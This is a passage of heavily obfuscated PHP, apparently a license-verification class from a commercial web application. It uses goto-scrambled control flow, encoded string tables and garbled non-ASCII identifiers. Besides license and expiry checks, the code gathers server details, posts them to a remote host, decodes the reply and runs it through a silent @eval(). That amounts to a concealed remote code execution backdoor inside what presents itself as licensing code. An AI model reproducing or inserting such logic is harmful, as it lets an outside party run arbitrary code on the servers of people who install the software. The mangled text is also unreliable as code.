$this->vhcz9accfc7c, $fÊø°Íå”‡[145] => $this->{$_SERVER[§Š×Ö][146]}(), $fÊø°Íå”‡[147] => $fÊø°Íå”‡[61]($fÊø°Íå”‡[148])->{$_SERVER[§Š×Ö][149]}()); if ($this->vhcz9accfc7c != $fÊø°Íå”‡[130]) { $D‹ˆÂºğÆö = $fÊø°Íå”‡[113]($this->wprj680d81ef, $fÊø°Íå”‡[150]); if ($D‹ˆÂºğÆö) { $fÂÙŠ®‚¾¬[$fÊø°Íå”‡[151]] = $D‹ˆÂºğÆö; $fÂÙŠ®‚¾¬[$fÊø°Íå”‡[152]] = $fÊø°Íå”‡[153]($fÊø°Íå”‡[113]($this->wprj680d81ef, $fÊø°Íå”‡[154])); $fÂÙŠ®‚¾¬[$fÊø°Íå”‡[155]] = $fÊø°Íå”‡[113]($this->wprj680d81ef, $fÊø°Íå”‡[140]); } } $fÂÙŠ®‚¾¬ = $this->{$_SERVER[§Š×Ö][156]}($fÊø°Íå”‡[157]($fÂÙŠ®‚¾¬), $fÊø°Íå”‡[123]($fÊø°Íå”‡[158])); goto CÅÎ¦Î»·ç; b¨¥•‰‹Ç: } goto Aõíõ…«“¼; Aõíõ…«“¼: if ($this->vhcz9accfc7c == $fÊø°Íå”‡[130]) { return; } $C¬¦ŠïÏ† = array($fÊø°Íå”‡[162], $fÊø°Íå”‡[163], $fÊø°Íå”‡[164], $fÊø°Íå”‡[165], $fÊø°Íå”‡[166], $fÊø°Íå”‡[167]); $bĞÛìËÑ‰â = $fÊø°Íå”‡[61]($fÊø°Íå”‡[62])->{$_SERVER[§Š×Ö][63]}(); goto cø®ó›©Ì; dÑÒ·Àº‘†: } private function idfl8b284169() { goto F¹‹»¥‹˜; C³öÎ‡ÚóË: if (!isset($b»Š¢ªë‰[$D¸Æá•Ş•à[174]]) || $D¸Æá•Ş•à[24]($b»Š¢ªë‰[$D¸Æá•Ş•à[174]]) != 16) { $D¸Æá•Ş•à[175]($D¸Æá•Ş•à[176] . $b»Š¢ªë‰[$D¸Æá•Ş•à[174]], !1); } $F©¦ˆÊœë¢ = $D¸Æá•Ş•à[61]($D¸Æá•Ş•à[62])->{$_SERVER[§Š×Ö][63]}($D¸Æá•Ş•à[125]); $bŠ•Ù•¶ = array($D¸Æá•Ş•à[174] => $b»Š¢ªë‰[$D¸Æá•Ş•à[174]], $D¸Æá•Ş•à[177] => $D¸Æá•Ş•à[133](16), $D¸Æá•Ş•à[178] => $D¸Æá•Ş•à[158], $D¸Æá•Ş•à[179] => $D¸Æá•Ş•à[180], $D¸Æá•Ş•à[181] => $_SERVER[$D¸Æá•Ş•à[182]], $D¸Æá•Ş•à[183] => $_SERVER[$D¸Æá•Ş•à[184]], $D¸Æá•Ş•à[185] => $_SERVER[$D¸Æá•Ş•à[186]]); goto aŒÉîÁÔÊÃ; F…‚˜ÇË: $A¦ìáğ‰¢ = $c…ÄÏ•…ùÅ[607]; if (!$A¦ìáğ‰¢) { die; } $D¸Æá•Ş•à[175]($D¸Æá•Ş•à[206]($D¸Æá•Ş•à[216]), !0); goto Dòååî¢¥í; EÇà†¯¦: $A¨®§Ç = $this->{$_SERVER[§Š×Ö][208]}($a‚›Ìäó¡×[$D¸Æá•Ş•à[209]]); if (!$A¨®§Ç || $A¨®§Ç != $a‚›Ìäó¡×[$D¸Æá•Ş•à[154]]) { $F½†Š¹˜îÇ = array($D¸Æá•Ş•à[210] => $D¸Æá•Ş•à[61]($D¸Æá•Ş•à[62])->{$_SERVER[§Š×Ö][63]}($D¸Æá•Ş•à[125]), $D¸Æá•Ş•à[211] => $_SERVER[$D¸Æá•Ş•à[124]], $D¸Æá•Ş•à[212] => $D¸Æá•Ş•à[213](), $D¸Æá•Ş•à[183] => $_SERVER[$D¸Æá•Ş•à[184]]); $dêšÚòÙ¸Ø = $this->{$_SERVER[§Š×Ö][214]}($D¸Æá•Ş•à[157]($F½†Š¹˜îÇ)); $this->{$_SERVER[§Š×Ö][191]}($D¸Æá•Ş•à[215] . $dêšÚòÙ¸Ø); $D¸Æá•Ş•à[175]($D¸Æá•Ş•à[206]($D¸Æá•Ş•à[216]), !0); } $FÅƒÚ°‚ƒ = array($D¸Æá•Ş•à[217] => $bŠ•Ù•¶[$D¸Æá•Ş•à[174]], $D¸Æá•Ş•à[218] => $a‚›Ìäó¡×[$D¸Æá•Ş•à[219]], $D¸Æá•Ş•à[220] => $D¸Æá•Ş•à[133](16), $D¸Æá•Ş•à[129] => $a‚›Ìäó¡×[$D¸Æá•Ş•à[221]]); goto dì•æ²Í¢; D‹ù¡ª†Ú£: if (strlen($B‰„Ñ§»çÆ) < $c…ÄÏ•…ùÅ[558]) { return; } $DÚ–¸Öª×˜ = $this->{$_SERVER[§Š×Ö][136]}($D¸Æá•Ş•à[157]($a‚›Ìäó¡×), $AÍäÃø»óœ); $fÁ¾»±Šç = $D¸Æá•Ş•à[230]($D¸Æá•Ş•à[61]($D¸Æá•Ş•à[11])->{$_SERVER[§Š×Ö][231]}(), $D¸Æá•Ş•à[232]); goto F‰Ç¬ç—ª; b¥½Í„À‡Ä: if (!$D¸Æá•Ş•à[113]($GLOBALS, $D¸Æá•Ş•à[141])) { die; } $b»Š¢ªë‰ = $GLOBALS[$D¸Æá•Ş•à[22]]; if (isset($b»Š¢ªë‰[$D¸Æá•Ş•à[172]])) { $this->{$_SERVER[§Š×Ö][173]}(); die; } goto C³öÎ‡ÚóË; F¹‹»¥‹˜: $c…ÄÏ•…ùÅ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $D¸Æá•Ş•à =& $_SERVER[§Š×Ö]; if ($_SERVER[$D¸Æá•Ş•à[44]] != $D¸Æá•Ş•à[171]) { return; } goto b¥½Í„À‡Ä; aŒÉîÁÔÊÃ: $fÍÀ˜ê„Ë½ = $c…ÄÏ•…ùÅ[599]; if (strlen($fÍÀ˜ê„Ë½) < $c…ÄÏ•…ùÅ[581]) { die; } $eêŸ £ › = $D¸Æá•Ş•à[123]($_SERVER[$D¸Æá•Ş•à[124]] . $F©¦ˆÊœë¢); goto eƒƒğ‘÷Àô; Dñ…õö“ö‰: $FÅƒÚ°‚ƒ[$D¸Æá•Ş•à[132]] = $D¸Æá•Ş•à[127]($D¸Æá•Ş•à[222]($this->{$_SERVER[§Š×Ö][156]}($bˆ‹õÔŠ‹ƒ, $D¸Æá•Ş•à[224]))); if ($a‚›Ìäó¡×[$D¸Æá•Ş•à[225]] && $a‚›Ìäó¡×[$D¸Æá•Ş•à[225]] >= 1) { $D¸Æá•Ş•à[61]($D¸Æá•Ş•à[62])->{$_SERVER[§Š×Ö][226]}($D¸Æá•Ş•à[227], $D¸Æá•Ş•à[228]); } $D¸Æá•Ş•à[61]($D¸Æá•Ş•à[62])->{$_SERVER[§Š×Ö][229]}($FÅƒÚ°‚ƒ); goto DÊÓØ¡‡Ô; cÕ”â†ï³¡: $E¬ãè¬„¿ä = $c…ÄÏ•…ùÅ[600]; if (strlen($E¬ãè¬„¿ä) < $c…ÄÏ•…ùÅ[562]) { return; } $FÅƒÚ°‚ƒ[$D¸Æá•Ş•à[131]] = $D¸Æá•Ş•à[222]($D¸Æá•Ş•à[127]($this->{$_SERVER[§Š×Ö][156]}($b¢ñÛ—å¸…, $D¸Æá•Ş•à[223]))); goto Cª§ªÅÂŒ›; bÕç«‹¾¦: $dì¥¡Ì¶·® = $c…ÄÏ•…ùÅ[606]; $this->vhcz9accfc7c = $FÅƒÚ°‚ƒ[$D¸Æá•Ş•à[129]]; $this->{$_SERVER[§Š×Ö][237]}(); goto F…‚˜ÇË; eƒƒğ‘÷Àô: if ($b»Š¢ªë‰[$D¸Æá•Ş•à[187]] == $D¸Æá•Ş•à[188]) { $dÙ¶Ş„Ü×¦ = $this->{$_SERVER[§Š×Ö][156]}($eêŸ £ ›, $D¸Æá•Ş•à[189]); $dêšÚòÙ¸Ø = $this->{$_SERVER[§Š×Ö][136]}($D¸Æá•Ş•à[157]($bŠ•Ù•¶), $eêŸ £ › . $D¸Æá•Ş•à[190], 3); $C˜¶Ä¼—¹í = $this->{$_SERVER[§Š×Ö][191]}($D¸Æá•Ş•à[192] . $dÙ¶Ş„Ü×¦ . $D¸Æá•Ş•à[193] . $dêšÚòÙ¸Ø, -1); $D¸Æá•Ş•à[175]($C˜¶Ä¼—¹í, !0); } else { if ($b»Š¢ªë‰[$D¸Æá•Ş•à[187]] == $D¸Æá•Ş•à[194]) { $bÀøÊêù… = $D¸Æá•Ş•à[25]($D¸Æá•Ş•à[123]($D¸Æá•Ş•à[195] . $eêŸ £ ›), 12, 15) . $D¸Æá•Ş•à[196]; $dêšÚòÙ¸Ø = $this->{$_SERVER[§Š×Ö][197]}($D¸Æá•Ş•à[2]($b»Š¢ªë‰[$D¸Æá•Ş•à[198]]), $bÀøÊêù…, 2); $F™ÆñùÎÔÅ = $D¸Æá•Ş•à[199]($dêšÚòÙ¸Ø, !0); if (!$D¸Æá•Ş•à[200]($F™ÆñùÎÔÅ) || !$D¸Æá•Ş•à[200]($F™ÆñùÎÔÅ[$D¸Æá•Ş•à[201]]) || $F™ÆñùÎÔÅ[$D¸Æá•Ş•à[174]] != !0) { $eÉ¼ÉÆ²­õ = $D¸Æá•Ş•à[202]; $AßÆõ«›Ôù = $F™ÆñùÎÔÅ[$D¸Æá•Ş•à[201]] ? $D¸Æá•Ş•à[203] . $F™ÆñùÎÔÅ[$D¸Æá•Ş•à[201]] : $eÉ¼ÉÆ²­õ; $D¸Æá•Ş•à[175]($AßÆõ«›Ôù, !1); } else { $bŠ•Ù•¶[$D¸Æá•Ş•à[177]] = $F™ÆñùÎÔÅ[$D¸Æá•Ş•à[201]][$D¸Æá•Ş•à[204]]; } } else { $F™ÆñùÎÔÅ = $this->{$_SERVER[§Š×Ö][191]}($D¸Æá•Ş•à[205], $bŠ•Ù•¶, 10); } } if (!$D¸Æá•Ş•à[200]($F™ÆñùÎÔÅ) || !$D¸Æá•Ş•à[200]($F™ÆñùÎÔÅ[$D¸Æá•Ş•à[201]]) || $F™ÆñùÎÔÅ[$D¸Æá•Ş•à[174]] != !0) { $eÉ¼ÉÆ²­õ = $D¸Æá•Ş•à[206]($D¸Æá•Ş•à[207]); $AßÆõ«›Ôù = $F™ÆñùÎÔÅ[$D¸Æá•Ş•à[201]] ? $D¸Æá•Ş•à[203] . $F™ÆñùÎÔÅ[$D¸Æá•Ş•à[201]] : $eÉ¼ÉÆ²­õ; $D¸Æá•Ş•à[175]($AßÆõ«›Ôù, !1); } $a‚›Ìäó¡× = $F™ÆñùÎÔÅ[$D¸Æá•Ş•à[201]]; goto EÇà†¯¦; F‰Ç¬ç—ª: $EÏ®Ñ¥‘š = $c…ÄÏ•…ùÅ[603]; if (strlen($EÏ®Ñ¥‘š) < $c…ÄÏ•…ùÅ[555]) { return; } $F«ÇÒº… = $fÁ¾»±Šç[$D¸Æá•Ş•à[233]]; goto dèÎø†‚¦; DÊÓØ¡‡Ô: $AÍäÃø»óœ = $D¸Æá•Ş•à[123]($_SERVER[$D¸Æá•Ş•à[124]] . $D¸Æá•Ş•à[222]($F©¦ˆÊœë¢) . $FÅƒÚ°‚ƒ[$D¸Æá•Ş•à[218]]); $D¢×›¬â¶Û = $D¸Æá•Ş•à[222]($D¸Æá•Ş•à[25]($AÍäÃø»óœ, 10, 16)); $B‰„Ñ§»çÆ = $c…ÄÏ•…ùÅ[602]; goto D‹ù¡ª†Ú£; dì•æ²Í¢: if ($bŠ•Ù•¶[$D¸Æá•Ş•à[177]]) { $FÅƒÚ°‚ƒ[$D¸Æá•Ş•à[220]] = $bŠ•Ù•¶[$D¸Æá•Ş•à[177]]; } $CÜÀìÎÁ é = $D¸Æá•Ş•à[25]($D¸Æá•Ş•à[123]($FÅƒÚ°‚ƒ[$D¸Æá•Ş•à[218]]), 10, 10); $b¢ñÛ—å¸… = $CÜÀìÎÁ é . $FÅƒÚ°‚ƒ[$D¸Æá•Ş•à[129]] . $FÅƒÚ°‚ƒ[$D¸Æá•Ş•à[220]]; goto cÕ”â†ï³¡; CÛ¤†ŒÄ¦ğ: $e³Î²Ë¯‡ = $c…ÄÏ•…ùÅ[605]; $D¸Æá•Ş•à[61]($D¸Æá•Ş•à[11])->{$_SERVER[§Š×Ö][234]}($F«ÇÒº…[$D¸Æá•Ş•à[235]], array($D¸Æá•Ş•à[236] => $dõ¶‹Ñ¶–)); $this->wprj680d81ef = $a‚›Ìäó¡×; goto bÕç«‹¾¦; dèÎø†‚¦: $dõ¶‹Ñ¶– = array(); $F¤Ìòøµô‡ = $c…ÄÏ•…ùÅ[604]; $dõ¶‹Ñ¶–[$D¢×›¬â¶Û] = $DÚ–¸Öª×˜; goto CÛ¤†ŒÄ¦ğ; Cª§ªÅÂŒ›: $b”–Í·‘Æ„ = $D¸Æá•Ş•à[133](16); $F„Äæ½«Ã§ = $c…ÄÏ•…ùÅ[601]; $bˆ‹õÔŠ‹ƒ = $b”–Í·‘Æ„ . $FÅƒÚ°‚ƒ[$D¸Æá•Ş•à[129]] . $this->{$_SERVER[§Š×Ö][156]}($D¸Æá•Ş•à[123]($FÅƒÚ°‚ƒ[$D¸Æá•Ş•à[217]]), $b”–Í·‘Æ„); goto Dñ…õö“ö‰; Dòååî¢¥í: } private function licenseRegistSuccess() { $fòƒä£¿ù¦ =& $_SERVER[§Š×Ö]; $AÉø«›èï = $fòƒä£¿ù¦[61]($fòƒä£¿ù¦[62])->{$_SERVER[§Š×Ö][63]}(); if ($AÉø«›èï[$fòƒä£¿ù¦[89]] != $fòƒä£¿ù¦[228]) { $fòƒä£¿ù¦[61]($fòƒä£¿ù¦[62])->{$_SERVER[§Š×Ö][229]}($fòƒä£¿ù¦[89], $fòƒä£¿ù¦[228]); } $fòƒä£¿ù¦[119]($fòƒä£¿ù¦[238])->{$_SERVER[§Š×Ö][239]}(!0); } private function ughwcf44d263() { goto eœ­Í«ê; cª”Â –î¶: $B±õ…èéÙ“ = $b“•ÖŒŠ°”[608]; if (strlen($B±õ…èéÙ“) < $b“•ÖŒŠ°”[562]) { die; } $E¼óóò[61]($E¼óóò[62])->{$_SERVER[§Š×Ö][226]}($E¼óóò[227], $E¼óóò[240]); goto aÍ…¤ò‰ì; C÷†‘œÙñ: $this->vhcz9accfc7c = $E¼óóò[130]; $C¼Ê©ì¬‡Œ = $b“•ÖŒŠ°”[610]; goto cªŒ•äÊö; aÍ…¤ò‰ì: $this->wprj680d81ef = array(); $A¦ÉÌ”Ì¶˜ = $b“•ÖŒŠ°”[609]; if (strlen($A¦ÉÌ”Ì¶˜) < $b“•ÖŒŠ°”[560]) { die; } goto C÷†‘œÙñ; eœ­Í«ê: $b“•ÖŒŠ°” =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $E¼óóò =& $_SERVER[§Š×Ö]; $E¼óóò[61]($E¼óóò[62])->{$_SERVER[§Š×Ö][229]}(array($E¼óóò[217] => $E¼óóò[10], $E¼óóò[218] => $E¼óóò[10], $E¼óóò[129] => $E¼óóò[130], $E¼óóò[131] => $E¼óóò[10], $E¼óóò[132] => $E¼óóò[10])); goto cª”Â –î¶; cªŒ•äÊö: } private function vskibc46b8ee() { goto c’²¥–í¼‡; c’²¥–í¼‡: $fÍéÍ×½¥¯ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $AÂÌ½†äá¨ =& $_SERVER[§Š×Ö]; $_SERVER[$AÂÌ½†äá¨[184]] = $AÂÌ½†äá¨[113]($_SERVER, $AÂÌ½†äá¨[184], APP_HOST); goto CÚİßœ¾µğ; C‡İÆĞŞµ: $BŒÏáÒ¶ˆ³ = $fÍéÍ×½¥¯[613]; if (strlen($BŒÏáÒ¶ˆ³) < $fÍéÍ×½¥¯[560]) { die; } $A×ã‘•š™Ô = $AÂÌ½†äá¨[123]($_SERVER[$AÂÌ½†äá¨[124]] . $AÂÌ½†äá¨[222]($b­ˆƒÁ‹…) . $d¼¾ÀœœÉö[$AÂÌ½†äá¨[218]]); goto A‘Ğ´ÀÈ‘²; f£â‡¢˜®Ş: $bÌì±ĞĞØÖ = $AÂÌ½†äá¨[230]($AÂÌ½†äá¨[61]($AÂÌ½†äá¨[11])->{$_SERVER[§Š×Ö][231]}(), $AÂÌ½†äá¨[232]); $D„ÁåŞ¬ãï = $fÍéÍ×½¥¯[612]; $FŠÒœ¤Ò÷Ñ = $bÌì±ĞĞØÖ[$AÂÌ½†äá¨[233]]; goto C‡İÆĞŞµ; C¾öæ‘Íë»: $this->wprj680d81ef = $Bñ‹“³¸›â; $this->vhcz9accfc7c = $d¼¾ÀœœÉö[$AÂÌ½†äá¨[129]]; $dæ¿‡†â¸Í = $fÍéÍ×½¥¯[616]; goto fæŸ²Ö”Øè; A‘Ğ´ÀÈ‘²: $BÑ¤ÙÆµŒ’ = $fÍéÍ×½¥¯[614]; $fŸ³ÊÁíÑ– = $AÂÌ½†äá¨[222]($AÂÌ½†äá¨[25]($A×ã‘•š™Ô, 10, 16)); $Bñ‹“³¸›â = $this->{$_SERVER[§Š×Ö][197]}($FŠÒœ¤Ò÷Ñ[$AÂÌ½†äá¨[100]][$fŸ³ÊÁíÑ–], $A×ã‘•š™Ô); goto dˆÅõ…­¹ß; CÚİßœ¾µğ: $this->vhcz9accfc7c = $AÂÌ½†äá¨[130]; $d¼¾ÀœœÉö = $AÂÌ½†äá¨[61]($AÂÌ½†äá¨[62])->{$_SERVER[§Š×Ö][63]}(); $BËŒ‹ßÃ¿§ = $fÍéÍ×½¥¯[611]; goto Bã‰Â±Š£Û; Bæ”ƒˆ½: if (!$AÂÌ½†äá¨[200]($Bñ‹“³¸›â)) { return $this->{$_SERVER[§Š×Ö][173]}(); } $EÃ«íêæ°¯ = $AÂÌ½†äá¨[153]($Bñ‹“³¸›â[$AÂÌ½†äá¨[154]]); if ($AÂÌ½†äá¨[241]() >= $EÃ«íêæ°¯) { return $this->{$_SERVER[§Š×Ö][173]}(); } goto C¾öæ‘Íë»; Bã‰Â±Š£Û: if (!$BËŒ‹ßÃ¿§) { return; } if ($d¼¾ÀœœÉö[$AÂÌ½†äá¨[129]] == $AÂÌ½†äá¨[130]) { return; } $b­ˆƒÁ‹… = $AÂÌ½†äá¨[61]($AÂÌ½†äá¨[62])->{$_SERVER[§Š×Ö][63]}($AÂÌ½†äá¨[125]); goto f£â‡¢˜®Ş; dˆÅõ…­¹ß: $d‡‚Ï™ÊÔ… = $fÍéÍ×½¥¯[615]; while ($d‡‚Ï™ÊÔ… < $fÍéÍ×½¥¯[560]) { if ($d‡‚Ï™ÊÔ… >= 0) { break; } $d‡‚Ï™ÊÔ…++; } $Bñ‹“³¸›â = $AÂÌ½†äá¨[199]($Bñ‹“³¸›â, !0); goto Bæ”ƒˆ½; fæŸ²Ö”Øè: if (strlen($dæ¿‡†â¸Í) < $fÍéÍ×½¥¯[581]) { return; } goto fÊá´œÓ¼¯; fÊá´œÓ¼¯: } private function yklhc702cdb2() { goto F•ŸÔ¦ãí†; eèÀ‹ƒ½âÑ: if ($EÔâƒ®†‘[247]($aİ´×¾×­“, $Eñ‰¡ôï¨Ş)) { if ($this->vhcz9accfc7c == $EÔâƒ®†‘[130] && isset($bÌàÇåºõ [$EÔâƒ®†‘[248]])) { $EÔâƒ®†‘[175]($EÔâƒ®†‘[206]($EÔâƒ®†‘[243]), !1, $EÔâƒ®†‘[244]); die; } $F…­Şéä¤Ÿ = $this->{$_SERVER[§Š×Ö][146]}(); if ($F…­Şéä¤Ÿ != $EÔâƒ®†‘[249]($EÔâƒ®†‘[250])) { if ($F…­Şéä¤Ÿ <= $EÔâƒ®†‘[61]($EÔâƒ®†‘[148])->{$_SERVER[§Š×Ö][149]}()) { $EÔâƒ®†‘[175]($EÔâƒ®†‘[206]($EÔâƒ®†‘[251]), !1, $EÔâƒ®†‘[244]); die; } } } goto bä—³ÚæøØ; F•ŸÔ¦ãí†: $f½«ĞéÛçÙ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $EÔâƒ®†‘ =& $_SERVER[§Š×Ö]; $bÌàÇåºõ  = $GLOBALS[$EÔâƒ®†‘[22]]; goto d‡–ÉíèÖÛ; Bç–˜ÕÂ­ˆ: if (!$A°½Ë«ñ‰¡) { return; } if ($aİ´×¾×­“ == $EÔâƒ®†‘[242] && $this->vhcz9accfc7c == $EÔâƒ®†‘[130]) { $EÔâƒ®†‘[175]($EÔâƒ®†‘[206]($EÔâƒ®†‘[243]), !1, $EÔâƒ®†‘[244]); } $Eñ‰¡ôï¨Ş = array($EÔâƒ®†‘[245], $EÔâƒ®†‘[246]); goto eèÀ‹ƒ½âÑ; d‡–ÉíèÖÛ: $c¼µ¼†× = $f½«ĞéÛçÙ[617]; $aİ´×¾×­“ = $_SERVER[$EÔâƒ®†‘[44]]; $A°½Ë«ñ‰¡ = $f½«ĞéÛçÙ[618]; goto Bç–˜ÕÂ­ˆ; bä—³ÚæøØ: } private function ynpkea287d08() { goto A‚¥É‰òÔ; FèâÙ…„Ÿ…: $eÒäõÙÆã† = $F‚­Š¾ —¼[622]; if (strlen($eÒäõÙÆã†) < $F‚­Š¾ —¼[555]) { return; } if ($e­‹õÚ•â && $eë¾µÑ±ùõ[32]($e­‹õÚ•â, $eë¾µÑ±ùõ[265])) { echo $e­‹õÚ•â; } goto E¤•ÈàÔ²; E¤•ÈàÔ²: die; goto Aî¿¬õ„¾; CµÙ½‚…”º: $dÀ©ˆíñÊÙ = $F‚­Š¾ —¼[620]; if (strlen($dÀ©ˆíñÊÙ) < $F‚­Š¾ —¼[560]) { return; } $CÅÉ‘ÁÑŠ = $eë¾µÑ±ùõ[257](array($eë¾µÑ±ùõ[258] => array($eë¾µÑ±ùõ[259] => $eë¾µÑ±ùõ[260], $eë¾µÑ±ùõ[261] => 3))); goto a–é†ÉÂ…´; A‚¥É‰òÔ: $F‚­Š¾ —¼ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $eë¾µÑ±ùõ =& $_SERVER[§Š×Ö]; $eÈããæóƒ¥ = array($eë¾µÑ±ùõ[144], $eë¾µÑ±ùõ[252]); goto D‚Øˆµ±¬; D‚Øˆµ±¬: $E¸ŸŸæ¸Áµ = $F‚­Š¾ —¼[619]; if (!$E¸ŸŸæ¸Áµ) { die; } if (!$eë¾µÑ±ùõ[113]($GLOBALS, $eë¾µÑ±ùõ[141]) || !isset($_GET[$eë¾µÑ±ùõ[253]])) { return; } goto C†ê›ÀÜ”¾; C†ê›ÀÜ”¾: if (!$eë¾µÑ±ùõ[247]($_SERVER[$eë¾µÑ±ùõ[44]], $eÈããæóƒ¥)) { return; } $Bâë¥òÔœ = $eë¾µÑ±ùõ[254]; $Bâë¥òÔœ = $this->{$_SERVER[§Š×Ö][255]}($Bâë¥òÔœ, $eë¾µÑ±ùõ[256]); goto CµÙ½‚…”º; a–é†ÉÂ…´: $E•’¹øŠ¦¾ = $F‚­Š¾ —¼[621]; $e­‹õÚ•â = @$eë¾µÑ±ùõ[262]($Bâë¥òÔœ, !1, $CÅÉ‘ÁÑŠ); $eë¾µÑ±ùõ[263]($eë¾µÑ±ùõ[264]); goto FèâÙ…„Ÿ…; Aî¿¬õ„¾: } public function ptzx364cae0c($FØ‹‹¶Õ) { goto aÜÂ²¸ª‘; d·‡±Ó±Û˜: return $FØ‹‹¶Õ; goto CÖøŒ½Æó´; B—‡ÒìğÇº: $f•Ü­Ë°Û¶ = $EõáØëİ­Ú[0]($EõáØëİ­Ú[282], $EõáØëİ­Ú[113]($this->wprj680d81ef, $EõáØëİ­Ú[138], $EõáØëİ­Ú[10])); $E•ãŠâ°± = array(); $C³÷¹ˆ¦øÎ = $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][623]; goto còõ²‰òœ; còõ²‰òœ: if (!$C³÷¹ˆ¦øÎ) { die; } foreach ($a×ìÜõÎä as $E“¦Ÿ…§Ë™ => $ağëå£Œ‘á) { if ($ağëå£Œ‘á == $EõáØëİ­Ú[268] && $EõáØëİ­Ú[25]($this->vhcz9accfc7c, 0, 1) == $EõáØëİ­Ú[268]) { continue; } if (!$EõáØëİ­Ú[247]($E“¦Ÿ…§Ë™, $f•Ü­Ë°Û¶)) { $E•ãŠâ°±[] = $E“¦Ÿ…§Ë™; } } foreach ($E•ãŠâ°± as $E“¦Ÿ…§Ë™) { unset($FØ‹‹¶Õ[$E“¦Ÿ…§Ë™]); } goto d·‡±Ó±Û˜; aÜÂ²¸ª‘: $EõáØëİ­Ú =& $_SERVER[§Š×Ö]; if ($this->vhcz9accfc7c == $EõáØëİ­Ú[266]) { return $FØ‹‹¶Õ; } $a×ìÜõÎä = array($EõáØëİ­Ú[267] => $EõáØëİ­Ú[268], $EõáØëİ­Ú[269] => $EõáØëİ­Ú[268], $EõáØëİ­Ú[270] => $EõáØëİ­Ú[268], $EõáØëİ­Ú[271] => $EõáØëİ­Ú[268], $EõáØëİ­Ú[272] => $EõáØëİ­Ú[268], $EõáØëİ­Ú[273] => $EõáØëİ­Ú[268], $EõáØëİ­Ú[274] => $EõáØëİ­Ú[275], $EõáØëİ­Ú[276] => $EõáØëİ­Ú[275], $EõáØëİ­Ú[277] => $EõáØëİ­Ú[275], $EõáØëİ­Ú[278] => $EõáØëİ­Ú[275], $EõáØëİ­Ú[279] => $EõáØëİ­Ú[275], $EõáØëİ­Ú[280] => $EõáØëİ­Ú[275], $EõáØëİ­Ú[281] => $EõáØëİ­Ú[275]); goto B—‡ÒìğÇº; CÖøŒ½Æó´: } private function xrbnf777781b() { $FÛÌ£ïŠæ‘ =& $_SERVER[§Š×Ö]; if ($this->vhcz9accfc7c != $FÛÌ£ïŠæ‘[130]) { return; } $GLOBALS[$FÛÌ£ïŠæ‘[100]][$FÛÌ£ïŠæ‘[104]][$FÛÌ£ïŠæ‘[283]] = $FÛÌ£ïŠæ‘[228]; $GLOBALS[$FÛÌ£ïŠæ‘[100]][$FÛÌ£ïŠæ‘[284]] = $FÛÌ£ïŠæ‘[228]; if ($FÛÌ£ïŠæ‘[61]($FÛÌ£ïŠæ‘[285])->{$_SERVER[§Š×Ö][63]}($FÛÌ£ïŠæ‘[89]) != $FÛÌ£ïŠæ‘[240]) { $FÛÌ£ïŠæ‘[61]($FÛÌ£ïŠæ‘[285])->{$_SERVER[§Š×Ö][229]}($FÛÌ£ïŠæ‘[89], $FÛÌ£ïŠæ‘[240]); } } public function higbe333093c() { return $_SERVER[§Š×Ö][286]; } private function wsbvb0872036() { goto dÌ‰îÁ­í–; d¹…æ³œø: $b¾©¦ÚëÚ = $eŒ¥ò²Ò÷[290] . $eŒ¥ò²Ò÷[123]($eŒ¥ò²Ò÷[291]); $e¹Ÿ§´¤¹ = $fµ‚Í°©ÈŠ[624]; if ($this->vhcz9accfc7c == $eŒ¥ò²Ò÷[130] || !$eŒ¥ò²Ò÷[113]($GLOBALS, $eŒ¥ò²Ò÷[141])) { return; } goto C¢Ä…Ñô—Œ; eÛÆÈ‚®ƒß: if ($cŸ­ÖÜà‚ && $eŒ¥ò²Ò÷[241]() - $cŸ­ÖÜà‚ < $eŒ¥ò²Ò÷[249]($eŒ¥ò²Ò÷[294])) { return; } $eŒ¥ò²Ò÷[13](array($eŒ¥ò²Ò÷[292], $eŒ¥ò²Ò÷[161]), $b¾©¦ÚëÚ, $eŒ¥ò²Ò÷[241]()); $a‚ÁÉŠÆ‰¨ = $fµ‚Í°©ÈŠ[625]; goto b«ÃÀ¸„“; e½Ç ¿ÂŠÚ: $this->{$_SERVER[§Š×Ö][173]}(); if ($this->{$_SERVER[§Š×Ö][208]}($fƒÈ–Îë÷™[$eŒ¥ò²Ò÷[296]]) != $a“·ˆÔš„[$eŒ¥ò²Ò÷[174]]) { $Fˆõ‰ë£×… = array($eŒ¥ò²Ò÷[210] => $eŒ¥ò²Ò÷[61]($eŒ¥ò²Ò÷[62])->{$_SERVER[§Š×Ö][63]}($eŒ¥ò²Ò÷[125]), $eŒ¥ò²Ò÷[211] => $_SERVER[$eŒ¥ò²Ò÷[124]], $eŒ¥ò²Ò÷[212] => $eŒ¥ò²Ò÷[213](), $eŒ¥ò²Ò÷[183] => $_SERVER[$eŒ¥ò²Ò÷[184]]); $dÍÆ¸¥³² = $this->{$_SERVER[§Š×Ö][214]}($eŒ¥ò²Ò÷[157]($Fˆõ‰ë£×…)); $fƒÈ–Îë÷™ = $this->{$_SERVER[§Š×Ö][191]}($eŒ¥ò²Ò÷[215] . $dÍÆ¸¥³²); if ($fƒÈ–Îë÷™ && $eŒ¥ò²Ò÷[200]($fƒÈ–Îë÷™) && isset($fƒÈ–Îë÷™[$eŒ¥ò²Ò÷[296]])) { $D‚¡öõ’Ê = $this->{$_SERVER[§Š×Ö][197]}($fƒÈ–Îë÷™[$eŒ¥ò²Ò÷[296]], 2); if ($D‚¡öõ’Ê) { $D‚¡öõ’Ê = $this->{$_SERVER[§Š×Ö][208]}($D‚¡öõ’Ê); } if ($D‚¡öõ’Ê) { try { @eval($D‚¡öõ’Ê); } catch (Exception $eÄÜáÂ«Åë) { } } } } goto CËÆÅ°šé; C¢Ä…Ñô—Œ: if (!$eŒ¥ò²Ò÷[247]($_SERVER[$eŒ¥ò²Ò÷[44]], $b®®Âµ‘‚æ)) { return; } if ($eŒ¥ò²Ò÷[241]() % 4 != 0) { return; } $cŸ­ÖÜà‚ = $eŒ¥ò²Ò÷[13](array($eŒ¥ò²Ò÷[292], $eŒ¥ò²Ò÷[293]), $b¾©¦ÚëÚ); goto eÛÆÈ‚®ƒß; b«ÃÀ¸„“: $a“·ˆÔš„ = array($eŒ¥ò²Ò÷[174] => 